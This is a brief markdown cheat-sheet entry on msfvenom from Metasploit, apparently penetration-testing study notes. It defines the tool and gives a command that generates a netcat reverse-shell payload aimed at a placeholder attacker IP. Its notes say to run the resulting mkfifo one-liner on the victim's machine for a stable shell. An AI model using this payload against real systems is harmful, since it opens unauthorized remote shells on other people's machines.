
# Definition
```python
>> Msfvenom is a versatile tool used within the Metasploit Framework, which is a popular platform for developing, testing, and executing exploits against target systems. Msfvenom is specifically used for generating payloads and encoding them to create various types of malicious code, such as shellcode, executable files, and scripts that can be used in penetration testing and security assessments.
```



# Usage
```python
>> msfvenom -p cmd/unix/reverse_netcat lhost=<ip of attacker machine> lport=<port to listen> R
	- a reverse use to connect to target machine from the attacker machine.
	- copy the mkfifo ... to the victims machine
	- reverse shell is useful when you want stable shell on the victims machine.



```





























